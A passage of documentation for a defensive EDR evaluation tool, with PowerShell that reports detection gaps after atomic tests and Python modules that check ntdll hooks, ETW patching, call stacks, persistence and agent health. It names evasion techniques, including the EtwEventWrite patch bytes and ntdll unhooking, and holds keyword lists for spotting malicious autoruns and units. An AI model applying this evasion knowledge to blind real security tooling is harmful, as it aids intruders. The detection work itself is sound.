                @{ range = @{ "@timestamp" = @{ gte = $startTime } } }
                @{ match = @{ "host.name" = "windows-target" } }
            )
        }
    }
    size = 100
    sort = @(@{ "@timestamp" = "asc" })
} | ConvertTo-Json -Depth 10

$detections = Invoke-RestMethod -Uri "$esUrl/.siem-signals-*/_search" `
    -Method POST -ContentType "application/json" -Body $query -ErrorAction SilentlyContinue

$detected = @{}
if ($detections -and $detections.hits) {
    foreach ($hit in $detections.hits.hits) {
        $rule = $hit._source.signal?.rule?.name ?? "unknown"
        $detected[$rule] = ($detected[$rule] ?? 0) + 1
    }
}
```

**Step 4 — Generate gap analysis report**
```powershell
# Gap analysis: which techniques were detected vs. missed
$gapReport = @()
foreach ($test in $atomicTests) {
    $detectedByEDR = $detected.Keys | Where-Object { $_ -like "*$($test.TID)*" }
    $gapReport += [PSCustomObject]@{
        TID       = $test.TID
        Technique = $test.Name
        Executed  = ($results | Where-Object TID -eq $test.TID | Select-Object -First 1).Status
        Detected  = if ($detectedByEDR) { "YES — $detectedByEDR" } else { "NO — BLIND SPOT" }
        Risk      = if ($detectedByEDR) { "LOW" } else { "HIGH" }
    }
}

Write-Host "`n=== EDR Gap Analysis Report ===" -ForegroundColor Cyan
Write-Host "Generated: $(Get-Date -Format 'o')" -ForegroundColor Gray
$gapReport | Format-Table TID, Technique, Detected, Risk -AutoSize

$blindSpots = $gapReport | Where-Object { $_.Detected -like "NO*" }
if ($blindSpots) {
    Write-Host "`n[!] BLIND SPOTS REQUIRING REMEDIATION:" -ForegroundColor Red
    $blindSpots | ForEach-Object {
        Write-Host "  - $($_.TID): $($_.Technique)" -ForegroundColor Red
    }
}

$gapReport | ConvertTo-Json | Set-Content -Path C:\lab\gap_analysis.json
Write-Host "`nFull report: C:\lab\gap_analysis.json" -ForegroundColor Gray
```

**Cleanup**
```powershell
# Cleanup atomic test artifacts
Invoke-AtomicTest T1562.001 -Cleanup -ErrorAction SilentlyContinue
Invoke-AtomicTest T1055.004 -Cleanup -ErrorAction SilentlyContinue
Remove-Item C:\lab\art_results.json, C:\lab\gap_analysis.json -ErrorAction SilentlyContinue
```

---

## PART C — EDREVAL FRAMEWORK

EDREVAL is a Python CLI tool that orchestrates assessments of EDR visibility across six modules: hook integrity, ETW provider coverage, call stack analysis, persistence detection, agent health, and honeypot deployment. All findings carry MITRE ATT&CK IDs and CVSS scores. Output is JSON and Markdown.

### Installation

```bash
# analysis-station
mkdir -p /opt/edreval/edreval
cd /opt/edreval
python3 -m venv .venv
source .venv/bin/activate
pip install colorama tabulate requests pywin32 2>/dev/null || pip install colorama tabulate requests
```

### File Layout

```
/opt/edreval/
├── edreval/
│   ├── __init__.py
│   ├── finding.py          # Finding dataclass + severity constants
│   ├── modules/
│   │   ├── __init__.py
│   │   ├── hooks.py        # Module 1: NTDLL hook integrity
│   │   ├── etw.py          # Module 2: ETW provider coverage
│   │   ├── callstack.py    # Module 3: Call-stack spoofing detection
│   │   ├── persistence.py  # Module 4: Persistence artifact scan
│   │   ├── health.py       # Module 5: EDR agent health
│   │   └── honeypot.py     # Module 6: Honeypot canary deployment
│   └── reporters/
│       ├── __init__.py
│       ├── json_reporter.py
│       └── markdown_reporter.py
└── edreval_cli.py          # Entry point
```

---

### `edreval/finding.py`

```python
"""
finding.py — Finding dataclass and severity constants for EDREVAL.
"""
from __future__ import annotations
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional, List


# Severity constants (aligned with CVSS base score ranges)
class Severity:
    CRITICAL = "CRITICAL"  # CVSS 9.0–10.0
    HIGH     = "HIGH"      # CVSS 7.0–8.9
    MEDIUM   = "MEDIUM"    # CVSS 4.0–6.9
    LOW      = "LOW"       # CVSS 0.1–3.9
    INFO     = "INFO"      # CVSS 0.0


@dataclass
class Finding:
    """Represents a single EDR assessment finding."""
    id:          str                      # Unique finding ID, e.g., HOOK-001
    title:       str
    severity:    str                      # Severity constant
    cvss:        float                    # CVSS base score
    cwe:         Optional[str]            # CWE ID, e.g., CWE-693
    mitre:       str                      # ATT&CK ID, e.g., T1562.001
    description: str
    evidence:    str                      # Technical evidence / raw output
    remediation: str
    module:      str                      # Module that generated this finding
    platform:    str = "windows"          # windows / macos / linux / all
    timestamp:   str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )
    tags:        List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "title": self.title,
            "severity": self.severity,
            "cvss": self.cvss,
            "cwe": self.cwe,
            "mitre": self.mitre,
            "description": self.description,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "module": self.module,
            "platform": self.platform,
            "timestamp": self.timestamp,
            "tags": self.tags,
        }

    @property
    def severity_color(self) -> str:
        return {
            Severity.CRITICAL: "\033[91m",
            Severity.HIGH:     "\033[31m",
            Severity.MEDIUM:   "\033[33m",
            Severity.LOW:      "\033[34m",
            Severity.INFO:     "\033[37m",
        }.get(self.severity, "\033[0m")
```

---

### `edreval/modules/hooks.py`

```python
"""
hooks.py — Module 1: NTDLL user-mode hook integrity assessment.

Checks whether expected EDR hooks are present in ntdll.dll, whether the
.text section matches the on-disk copy, and whether multiple ntdll
mappings exist (peridot/fresh-mapping detection).
"""
from __future__ import annotations
import ctypes
import struct
import os
import hashlib
from typing import List

from edreval.finding import Finding, Severity

MODULE_NAME = "hooks"

# Functions commonly hooked by EDRs
HOOKED_FUNCTIONS = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtProtectVirtualMemory",
    "NtMapViewOfSection",
    "NtCreateSection",
    "NtOpenProcess",
    "NtQueueApcThread",
    "NtSetContextThread",
    "NtResumeThread",
]


def _get_ntdll_base() -> int:
    """Return the base address of ntdll.dll in the current process."""
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.GetModuleHandleA(b"ntdll.dll")
    if not handle:
        raise RuntimeError("Could not get ntdll.dll module handle")
    return handle


def _read_stub_bytes(func_name: str, ntdll_base: int, count: int = 8) -> bytes:
    """Read the first `count` bytes of a ntdll function stub."""
    kernel32 = ctypes.windll.kernel32
    fn_addr = kernel32.GetProcAddress(ntdll_base, func_name.encode())
    if not fn_addr:
        return b""
    buf = (ctypes.c_uint8 * count)()
    kernel32.ReadProcessMemory(
        ctypes.c_void_p(-1),  # current process
        ctypes.c_void_p(fn_addr),
        buf, count, None
    )
    return bytes(buf)


def _is_clean_stub(stub_bytes: bytes) -> bool:
    """Return True if stub has the unhooked pattern: 4C 8B D1 B8 xx xx 00 00."""
    if len(stub_bytes) < 8:
        return False
    return (stub_bytes[0] == 0x4C and stub_bytes[1] == 0x8B and
            stub_bytes[2] == 0xD1 and stub_bytes[3] == 0xB8 and
            stub_bytes[6] == 0x00 and stub_bytes[7] == 0x00)


def _is_hooked_stub(stub_bytes: bytes) -> bool:
    """Return True if stub has a jmp hook: E9 (rel32) or FF 25 (abs)."""
    if len(stub_bytes) < 2:
        return False
    return stub_bytes[0] == 0xE9 or (stub_bytes[0] == 0xFF and stub_bytes[1] == 0x25)


def _hash_ntdll_text_ondisk(path: str = r"C:\Windows\System32\ntdll.dll") -> str:
    """SHA-256 hash of ntdll.dll on disk."""
    if not os.path.exists(path):
        return ""
    with open(path, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()


def run(verbose: bool = False) -> List[Finding]:
    """Execute hook integrity checks and return findings."""
    findings: List[Finding] = []
    finding_idx = 1

    try:
        import ctypes.wintypes
        ntdll_base = _get_ntdll_base()
    except Exception as e:
        findings.append(Finding(
            id=f"HOOK-{finding_idx:03d}",
            title="NTDLL module handle resolution failed",
            severity=Severity.HIGH,
            cvss=7.5,
            cwe="CWE-693",
            mitre="T1562.001",
            description="Could not resolve ntdll.dll base address.",
            evidence=str(e),
            remediation="Verify the assessment is running on Windows with correct permissions.",
            module=MODULE_NAME,
            platform="windows",
        ))
        return findings

    hooked: List[str] = []
    unhooked: List[str] = []
    unknown: List[str] = []

    for func in HOOKED_FUNCTIONS:
        stub = _read_stub_bytes(func, ntdll_base)
        if not stub:
            unknown.append(func)
        elif _is_hooked_stub(stub):
            hooked.append(f"{func}: {stub.hex()}")
        elif _is_clean_stub(stub):
            unhooked.append(func)
        else:
            unknown.append(f"{func}: {stub.hex()}")

    if verbose:
        print(f"  [hooks] hooked={len(hooked)} unhooked={len(unhooked)} unknown={len(unknown)}")

    # Finding: no hooks present = EDR not installed or already bypassed
    if not hooked:
        finding_idx += 1
        findings.append(Finding(
            id=f"HOOK-{finding_idx:03d}",
            title="No EDR user-mode hooks detected in ntdll.dll",
            severity=Severity.CRITICAL,
            cvss=9.8,
            cwe="CWE-693",
            mitre="T1562.001",
            description=(
                "None of the monitored ntdll.dll functions have EDR inline hooks. "
                "Either no EDR is installed, the hooks were removed via ntdll unhooking, "
                "or the process is running in an environment that excludes EDR injection."
            ),
            evidence=f"Checked functions: {', '.join(HOOKED_FUNCTIONS)}\n"
                     f"All returned clean (unhooked) stubs.",
            remediation=(
                "1. Verify EDR agent is installed and service is running.\n"
                "2. Check EDR console for this endpoint.\n"
                "3. If hooks were expected but absent: investigate ntdll unhooking (T1562.001).\n"
                "4. Deploy kernel-mode telemetry (ETW TI provider, minifilter) as backup."
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["ntdll", "hook", "evasion"],
        ))
    elif len(unhooked) > 3:
        finding_idx += 1
        findings.append(Finding(
            id=f"HOOK-{finding_idx:03d}",
            title=f"Partial ntdll unhooking detected ({len(unhooked)} functions unhooked)",
            severity=Severity.CRITICAL,
            cvss=9.1,
            cwe="CWE-693",
            mitre="T1562.001",
            description=(
                f"{len(unhooked)} of {len(HOOKED_FUNCTIONS)} monitored functions "
                "have had their hooks removed. Selective ntdll unhooking is in progress."
            ),
            evidence=f"Unhooked: {', '.join(unhooked)}\nHooked: {len(hooked)} functions",
            remediation=(
                "Investigate process memory for unhooking code. "
                "Enable Sysmon ProcessTampering events. "
                "Add kernel-level integrity checks for ntdll .text section."
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["ntdll", "selective-unhook", "T1562.001"],
        ))

    # Finding: on-disk ntdll hash
    disk_hash = _hash_ntdll_text_ondisk()
    if disk_hash:
        finding_idx += 1
        findings.append(Finding(
            id=f"HOOK-{finding_idx:03d}",
            title="NTDLL on-disk hash captured for baseline",
            severity=Severity.INFO,
            cvss=0.0,
            cwe=None,
            mitre="DS0011",
            description="SHA-256 of ntdll.dll captured for future integrity comparison.",
            evidence=f"Path: C:\\Windows\\System32\\ntdll.dll\nSHA256: {disk_hash}",
            remediation="Store this hash; alert on any change.",
            module=MODULE_NAME,
            platform="windows",
            tags=["baseline", "integrity"],
        ))

    return findings
```

---

### `edreval/modules/etw.py`

```python
"""
etw.py — Module 2: ETW provider coverage assessment.

Checks which ETW providers critical for EDR visibility are active,
whether the EtwEventWrite function has been patched, and whether
PowerShell script block logging is enabled.
"""
from __future__ import annotations
import subprocess
import os
import ctypes
from typing import List

from edreval.finding import Finding, Severity

MODULE_NAME = "etw"

# Critical ETW providers for EDR telemetry
CRITICAL_PROVIDERS = {
    "Microsoft-Windows-Threat-Intelligence": "f4e1897c-bb5d-5668-f1d8-040f4d8dd344",
    "Microsoft-Windows-Kernel-Process":      "22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716",
    "Microsoft-Windows-Kernel-Audit-API-Calls": "e02a841c-75a3-4fa7-afc8-ae09cf9b7f23",
    "Microsoft-Windows-DotNETRuntime":       "e13c0d23-ccbc-4e12-931b-d9cc2eee27e4",
    "Microsoft-Windows-PowerShell":          "a0c1853b-5c40-4b15-8766-3cf1c58f985a",
    "Microsoft-Antimalware-AMFilter":        "cfeb0608-330e-4410-b00d-56d8da9986e6",
}


def _check_etweventwrite_patched() -> tuple[bool, str]:
    """Check if EtwEventWrite in ntdll has been patched (xor eax,eax; ret)."""
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll_h = kernel32.GetModuleHandleA(b"ntdll.dll")
        fn_addr = kernel32.GetProcAddress(ntdll_h, b"EtwEventWrite")
        if not fn_addr:
            return False, "Could not resolve EtwEventWrite"
        buf = (ctypes.c_uint8 * 4)()
        kernel32.ReadProcessMemory(ctypes.c_void_p(-1), ctypes.c_void_p(fn_addr),
                                   buf, 4, None)
        b = bytes(buf)
        hex_repr = b.hex()
        # Patched: 33 C0 C3 (xor eax,eax; ret)
        patched = (b[0] == 0x33 and b[1] == 0xC0 and b[2] == 0xC3)
        return patched, f"First bytes: {hex_repr}"
    except Exception as e:
        return False, str(e)


def _query_logman_providers() -> set:
    """Return set of active ETW provider names from logman."""
    try:
        result = subprocess.run(
            ["logman", "query", "providers"],
            capture_output=True, text=True, timeout=15
        )
        active = set()
        for line in result.stdout.splitlines():
            for name in CRITICAL_PROVIDERS:
                if name in line:
                    active.add(name)
        return active
    except Exception:
        return set()


def _check_ps_scriptblock_logging() -> bool:
    """Check if PowerShell ScriptBlock logging is enabled via registry."""
    try:
        import winreg
        key_path = r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as k:
            val, _ = winreg.QueryValueEx(k, "EnableScriptBlockLogging")
            return val == 1
    except Exception:
        return False


def run(verbose: bool = False) -> List[Finding]:
    findings: List[Finding] = []
    idx = 1

    # Check EtwEventWrite patch
    patched, evidence = _check_etweventwrite_patched()
    if patched:
        findings.append(Finding(
            id=f"ETW-{idx:03d}",
            title="EtwEventWrite function patched (xor eax,eax; ret)",
            severity=Severity.CRITICAL,
            cvss=9.8,
            cwe="CWE-284",
            mitre="T1562.006",
            description=(
                "The EtwEventWrite function in ntdll.dll has been overwritten with "
                "'xor eax,eax; ret' (bytes 33 C0 C3). All ETW events from this process "
                "are suppressed. EDR, PowerShell ScriptBlock logging, and .NET CLR "
                "telemetry are blind for this process."
            ),
            evidence=evidence,
            remediation=(
                "1. Terminate the offending process immediately.\n"
                "2. Investigate process creation chain (parent PID, command line).\n"
                "3. Deploy kernel-mode ETW consumer (PPL process) as backup.\n"
                "4. Monitor for NtProtectVirtualMemory calls on ntdll address ranges."
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["etw", "patch", "T1562.006"],
        ))
    idx += 1

    # Check active providers
    active_providers = _query_logman_providers()
    missing = [p for p in CRITICAL_PROVIDERS if p not in active_providers]
    if missing:
        findings.append(Finding(
            id=f"ETW-{idx:03d}",
            title=f"Critical ETW providers not active ({len(missing)} missing)",
            severity=Severity.HIGH,
            cvss=7.5,
            cwe="CWE-778",
            mitre="T1562.006",
            description=(
                f"{len(missing)} of {len(CRITICAL_PROVIDERS)} critical ETW providers "
                "are not in the active session list. Detection coverage is reduced."
            ),
            evidence=f"Missing: {', '.join(missing)}",
            remediation=(
                "Enable missing ETW providers via Windows Event Collector or EDR configuration.\n"
                "Microsoft-Windows-Threat-Intelligence requires a PPL consumer process."
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["etw", "provider", "coverage"],
        ))
    idx += 1

    # Check PowerShell ScriptBlock logging
    ps_logging = _check_ps_scriptblock_logging()
    if not ps_logging:
        findings.append(Finding(
            id=f"ETW-{idx:03d}",
            title="PowerShell ScriptBlock logging disabled",
            severity=Severity.MEDIUM,
            cvss=5.3,
            cwe="CWE-778",
            mitre="T1059.001",
            description=(
                "PowerShell ScriptBlock logging is not enabled via Group Policy. "
                "Malicious PowerShell commands (AMSI bypass, reflective loading) "
                "may not be captured in the event log."
            ),
            evidence="HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\"
                     "ScriptBlockLogging\\EnableScriptBlockLogging not set to 1",
            remediation=(
                "Set EnableScriptBlockLogging=1 via Group Policy:\n"
                "Computer Configuration → Administrative Templates → "
                "Windows Components → Windows PowerShell → "
                "Turn on PowerShell Script Block Logging → Enabled"
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["powershell", "logging", "T1059.001"],
        ))

    if verbose:
        print(f"  [etw] patched={patched} missing_providers={len(missing)} ps_logging={ps_logging}")

    return findings
```

---

### `edreval/modules/callstack.py`

```python
"""
callstack.py — Module 3: Call-stack spoofing detection.

Walks the current thread's call stack looking for:
  - Frames in non-module (heap/shellcode) memory
  - Suspiciously short stacks
  - RIP values outside any loaded module (.text section)
  - VEH registrations (AddVectoredExceptionHandler indicator)
"""
from __future__ import annotations
import ctypes
import ctypes.wintypes
from typing import List, Optional

from edreval.finding import Finding, Severity

MODULE_NAME = "callstack"

MAX_FRAMES = 64


def _capture_stack_frames() -> List[int]:
    """Capture return addresses from the current thread stack."""
    try:
        frames = (ctypes.c_void_p * MAX_FRAMES)()
        ntdll = ctypes.windll.ntdll
        # RtlCaptureStackBackTrace(FramesToSkip, FramesToCapture, BackTrace, BackTraceHash)
        count = ntdll.RtlCaptureStackBackTrace(0, MAX_FRAMES, frames, None)
        return [frames[i] for i in range(count) if frames[i]]
    except Exception:
        return []


def _is_in_module(addr: int, modules: List[tuple]) -> Optional[str]:
    """Return module name if addr falls within a known module range, else None."""
    for (base, size, name) in modules:
        if base <= addr < base + size:
            return name
    return None


def _get_loaded_modules() -> List[tuple]:
    """Return list of (base, size, name) for loaded modules."""
    modules = []
    try:
        psapi = ctypes.windll.psapi
        kernel32 = ctypes.windll.kernel32
        proc = kernel32.GetCurrentProcess()

        hMods = (ctypes.c_void_p * 1024)()
        needed = ctypes.c_ulong(0)
        if psapi.EnumProcessModules(proc, hMods, ctypes.sizeof(hMods), ctypes.byref(needed)):
            count = needed.value // ctypes.sizeof(ctypes.c_void_p)
            for i in range(count):
                base = hMods[i]
                if not base:
                    continue
                mi = ctypes.create_string_buffer(256)
                psapi.GetModuleBaseNameA(proc, base, mi, 256)
                info = ctypes.create_string_buffer(24)
                # MODULEINFO struct: lpBaseOfDll, SizeOfImage, EntryPoint
                psapi.GetModuleInformation(proc, ctypes.c_void_p(base), info, 24)
                size = int.from_bytes(info[8:12], "little")
                modules.append((base, size, mi.value.decode(errors="replace")))
    except Exception:
        pass
    return modules


def run(verbose: bool = False) -> List[Finding]:
    findings: List[Finding] = []
    idx = 1

    frames = _capture_stack_frames()
    if not frames:
        findings.append(Finding(
            id=f"CS-{idx:03d}",
            title="Stack capture returned no frames",
            severity=Severity.LOW,
            cvss=2.0,
            cwe=None,
            mitre="T1620",
            description="RtlCaptureStackBackTrace returned 0 frames.",
            evidence="count=0",
            remediation="Verify assessment is running with adequate permissions.",
            module=MODULE_NAME,
            platform="windows",
        ))
        return findings

    modules = _get_loaded_modules()
    unmodule_frames = []
    for addr in frames:
        mod = _is_in_module(addr, modules)
        if mod is None:
            unmodule_frames.append(hex(addr))

    if verbose:
        print(f"  [callstack] total_frames={len(frames)} unmodule={len(unmodule_frames)}")

    if unmodule_frames:
        idx += 1
        findings.append(Finding(
            id=f"CS-{idx:03d}",
            title=f"Call stack frames outside any loaded module ({len(unmodule_frames)} frames)",
            severity=Severity.CRITICAL,
            cvss=9.1,
            cwe="CWE-693",
            mitre="T1620",
            description=(
                f"{len(unmodule_frames)} return addresses on the current thread's call stack "
                "point to memory regions not backed by any loaded module (likely shellcode, "
                "heap-allocated trampolines, or reflective PE). This is a strong indicator "
                "of code injection or reflective loading."
            ),
            evidence=f"Unmodule frames: {', '.join(unmodule_frames[:8])}",
            remediation=(
                "Investigate memory regions at flagged addresses using WinDbg or x64dbg.\n"
                "Deploy EDR rules that alert on CreateThread/NtCreateThreadEx with "
                "start_address outside module ranges."
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["callstack", "shellcode", "T1620"],
        ))

    if len(frames) < 4:
        idx += 1
        findings.append(Finding(
            id=f"CS-{idx:03d}",
            title="Suspiciously short call stack (possible return address spoofing)",
            severity=Severity.HIGH,
            cvss=7.5,
            cwe="CWE-693",
            mitre="T1620",
            description=(
                f"The current thread has only {len(frames)} frames. "
                "Legitimate threads typically have 10+ frames. "
                "A very short stack can indicate return address spoofing, "
                "where fake frames are injected to hide the true call chain."
            ),
            evidence=f"Frame count: {len(frames)}",
            remediation=(
                "Correlate with thread creation events. "
                "Very short stacks on newly created threads performing suspicious "
                "allocations or injections should trigger an alert."
            ),
            module=MODULE_NAME,
            platform="windows",
            tags=["callstack", "spoof", "T1620"],
        ))

    return findings
```

---

### `edreval/modules/persistence.py`

```python
"""
persistence.py — Module 4: Cross-platform persistence artifact detection.

Windows: autorun registry keys, scheduled tasks, services.
macOS:   LaunchDaemons, LaunchAgents, Login Items.
Linux:   systemd units, cron, SSH authorized_keys, PAM modules.
"""
from __future__ import annotations
import os
import sys
import subprocess
from typing import List

from edreval.finding import Finding, Severity

MODULE_NAME = "persistence"

# Windows autorun registry keys (HKLM + HKCU)
WIN_AUTORUN_KEYS = [
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    r"SYSTEM\CurrentControlSet\Services",
]

# Suspicious LaunchDaemon/Agent dirs on macOS
MACOS_LAUNCH_DIRS = [
    "/Library/LaunchDaemons",
    "/Library/LaunchAgents",
    os.path.expanduser("~/Library/LaunchAgents"),
]

# Linux persistence paths
LINUX_PERSISTENCE_PATHS = [
    "/etc/systemd/system",
    "/etc/cron.d",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/pam.d",
    "/etc/ssh/sshd_config",
]


def _scan_windows() -> List[Finding]:
    findings = []
    idx = 1
    try:
        import winreg
        suspicious_entries = []
        for key_path in WIN_AUTORUN_KEYS[:2]:  # Run / RunOnce
            for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                try:
                    with winreg.OpenKey(hive, key_path) as k:
                        i = 0
                        while True:
                            try:
                                name, data, _ = winreg.EnumValue(k, i)
                                # Flag entries pointing to non-standard locations
                                data_lower = str(data).lower()
                                if any(s in data_lower for s in [
                                    "\\temp\\", "\\appdata\\", "\\users\\public\\",
                                    "powershell", "wscript", "cscript", "rundll32"
                                ]):
                                    suspicious_entries.append(
                                        f"[{('HKLM','HKCU')[hive==winreg.HKEY_CURRENT_USER]}] "
                                        f"{key_path}\\{name} = {data}"
                                    )
                                i += 1
                            except OSError:
                                break
                except OSError:
                    pass

        if suspicious_entries:
            findings.append(Finding(
                id=f"PERS-{idx:03d}",
                title=f"Suspicious autorun registry entries ({len(suspicious_entries)} found)",
                severity=Severity.HIGH,
                cvss=7.8,
                cwe="CWE-912",
                mitre="T1547.001",
                description=(
                    "Registry autorun entries pointing to temporary directories, "
                    "user-writable paths, or scripting engines (PowerShell, WScript) "
                    "indicate potential persistence."
                ),
                evidence="\n".join(suspicious_entries[:10]),
                remediation=(
                    "Review each entry. Remove unauthorized entries.\n"
                    "Block write access to Run/RunOnce keys via GPO for non-admin users."
                ),
                module=MODULE_NAME,
                platform="windows",
                tags=["persistence", "registry", "T1547.001"],
            ))
    except ImportError:
        pass
    return findings


def _scan_macos() -> List[Finding]:
    findings = []
    idx = 1
    suspicious = []
    for d in MACOS_LAUNCH_DIRS:
        if not os.path.isdir(d):
            continue
        for fname in os.listdir(d):
            if not fname.endswith(".plist"):
                continue
            fpath = os.path.join(d, fname)
            # Flag non-Apple plists
            if not fname.startswith("com.apple."):
                suspicious.append(fpath)

    if suspicious:
        findings.append(Finding(
            id=f"PERS-{idx:03d}",
            title=f"Non-Apple LaunchDaemon/Agent plists ({len(suspicious)} found)",
            severity=Severity.MEDIUM,
            cvss=6.1,
            cwe="CWE-912",
            mitre="T1543.004",
            description=(
                "LaunchDaemon or LaunchAgent plist files with non-Apple bundle IDs "
                "were found. These may represent third-party software or persistence implants."
            ),
            evidence="\n".join(suspicious[:20]),
            remediation=(
                "Review each plist. Verify the RunAtLoad/KeepAlive binary is legitimate.\n"
                "Remove unauthorized entries and use MDM to enforce allowed Launch items."
            ),
            module=MODULE_NAME,
            platform="macos",
            tags=["persistence", "launchd", "T1543.004"],
        ))
    return findings


def _scan_linux() -> List[Finding]:
    findings = []
    idx = 1

    # Check for non-distro systemd units in /etc/systemd/system
    suspicious_units = []
    systemd_dir = "/etc/systemd/system"
    if os.path.isdir(systemd_dir):
        for fname in os.listdir(systemd_dir):
            fpath = os.path.join(systemd_dir, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                content = open(fpath).read()
                # Flag units with payloads in temp/dev locations
                if any(s in content for s in ["/tmp/", "/dev/shm/", "/proc/", "memfd"]):
                    suspicious_units.append(fpath)
            except OSError:
                pass

    if suspicious_units:
        idx += 1
        findings.append(Finding(
            id=f"PERS-{idx:03d}",
            title=f"Suspicious systemd units referencing temp/proc paths ({len(suspicious_units)})",
            severity=Severity.CRITICAL,
            cvss=9.1,
            cwe="CWE-912",
            mitre="T1543.002",
            description=(
                "Systemd unit files referencing /tmp, /dev/shm, /proc, or memfd as "
                "ExecStart paths indicate fileless malware persistence."
            ),
            evidence="\n".join(suspicious_units),
            remediation=(
                "Remove suspicious unit files. Run: systemctl disable <unit>; "
                "systemctl stop <unit>. Investigate process that created the unit file."
            ),
            module=MODULE_NAME,
            platform="linux",
            tags=["persistence", "systemd", "fileless", "T1543.002"],
        ))

    # Check for root SSH authorized_keys with command= restriction bypass
    root_ssh = "/root/.ssh/authorized_keys"
    if os.path.exists(root_ssh):
        try:
            keys = open(root_ssh).read()
            cmd_keys = [l for l in keys.splitlines() if "command=" in l]
            if cmd_keys:
                idx += 1
                findings.append(Finding(
                    id=f"PERS-{idx:03d}",
                    title=f"SSH authorized_keys with command= restriction ({len(cmd_keys)} keys)",
                    severity=Severity.HIGH,
                    cvss=8.1,
                    cwe="CWE-912",
                    mitre="T1098.004",
                    description=(
                        "Root SSH authorized_keys contains entries with command= forced command. "
                        "This technique restricts what an SSH key can run but still provides "
                        "persistent access — or can be used to execute malicious commands on connect."
                    ),
                    evidence="\n".join(cmd_keys[:5]),
                    remediation=(
                        "Audit and remove unauthorized SSH keys. "
                        "Disable root SSH login: PermitRootLogin no in sshd_config. "
                        "Use certificate-based SSH with short-lived certs."
                    ),
                    module=MODULE_NAME,
                    platform="linux",
                    tags=["persistence", "ssh", "T1098.004"],
                ))
        except OSError:
            pass

    return findings


def run(verbose: bool = False) -> List[Finding]:
    platform = sys.platform

    if platform == "win32":
        findings = _scan_windows()
    elif platform == "darwin":
        findings = _scan_macos()
    else:
        findings = _scan_linux()

    if verbose:
        print(f"  [persistence] platform={platform} findings={len(findings)}")

    return findings
```

---

### `edreval/modules/health.py`

```python
"""
health.py — Module 5: EDR agent health verification.

Cross-platform checks: service state, process liveness, hook presence (Windows),
TCC integrity (macOS), auditd state (Linux), signature recency.
"""
from __future__ import annotations
import sys
import subprocess
import os
from typing import List

from edreval.finding import Finding, Severity

MODULE_NAME = "health"


def _check_windows() -> List[Finding]:
    findings = []
    idx = 1

    # Check Sysmon
    try:
        result = subprocess.run(
            ["sc", "query", "Sysmon64"],
            capture_output=True, text=True, timeout=10
        )
        if "RUNNING" not in result.stdout:
            findings.append(Finding(
                id=f"HEALTH-{idx:03d}",
                title="Sysmon64 service not running",
                severity=Severity.HIGH,
                cvss=7.5,
                cwe="CWE-778",
                mitre="T1562.001",
                description="Sysmon64 is not in RUNNING state. Process creation, "
                            "network, and registry telemetry are unavailable.",
                evidence=result.stdout[:500],
                remediation="Start Sysmon64: sc start Sysmon64. Investigate why it stopped.",
                module=MODULE_NAME, platform="windows",
                tags=["sysmon", "health"],
            ))
    except Exception as e:
        findings.append(Finding(
            id=f"HEALTH-{idx:03d}",
            title="Could not query Sysmon64 service",
            severity=Severity.MEDIUM, cvss=5.0,
            cwe=None, mitre="T1562.001",
            description="sc query Sysmon64 failed.",
            evidence=str(e),
            remediation="Ensure Sysmon is installed and sc.exe is accessible.",
            module=MODULE_NAME, platform="windows",
        ))
    idx += 1

    # Check Windows Defender real-time protection via PowerShell
    try:
        result = subprocess.run(
            ["powershell", "-NonInteractive", "-Command",
             "(Get-MpComputerStatus).RealTimeProtectionEnabled"],
            capture_output=True, text=True, timeout=15
        )
        rt_enabled = result.stdout.strip().lower() == "true"
        if not rt_enabled:
            findings.append(Finding(
                id=f"HEALTH-{idx:03d}",
                title="Windows Defender real-time protection disabled",
                severity=Severity.CRITICAL, cvss=9.1,
                cwe="CWE-693", mitre="T1562.001",
                description="Real-time protection is off. Malware will not be scanned on access.",
                evidence=f"RealTimeProtectionEnabled: {result.stdout.strip()}",
                remediation="Set-MpPreference -DisableRealtimeMonitoring $false",
                module=MODULE_NAME, platform="windows",
                tags=["defender", "rtp"],
            ))
    except Exception:
        pass
    idx += 1

    return findings


def _check_macos() -> List[Finding]:
    findings = []
    idx = 1

    # SIP check
    try:
        result = subprocess.run(["csrutil", "status"], capture_output=True, text=True, timeout=10)
        if "enabled" not in result.stdout.lower():
            findings.append(Finding(
                id=f"HEALTH-{idx:03d}",
                title="SIP (System Integrity Protection) is disabled",
                severity=Severity.CRITICAL, cvss=9.8,
                cwe="CWE-693", mitre="T1553.001",
                description="SIP disabled allows modification of protected system files, "
                            "rootkits, and kernel extension loading.",
                evidence=result.stdout.strip(),
                remediation="Boot to Recovery Mode, run: csrutil enable",
                module=MODULE_NAME, platform="macos",
                tags=["sip", "macos"],
            ))
    except Exception:
        pass
    idx += 1

    # Gatekeeper
    try:
        result = subprocess.run(["spctl", "--status"], capture_output=True, text=True, timeout=10)
        if "enabled" not in result.stdout.lower():
            findings.append(Finding(
                id=f"HEALTH-{idx:03d}",
                title="Gatekeeper is disabled",
                severity=Severity.HIGH, cvss=7.8,
                cwe="CWE-693", mitre="T1553.001",
                description="Gatekeeper disabled allows unsigned/unnotarized code to run.",
                evidence=result.stdout.strip(),
                remediation="sudo spctl --master-enable",
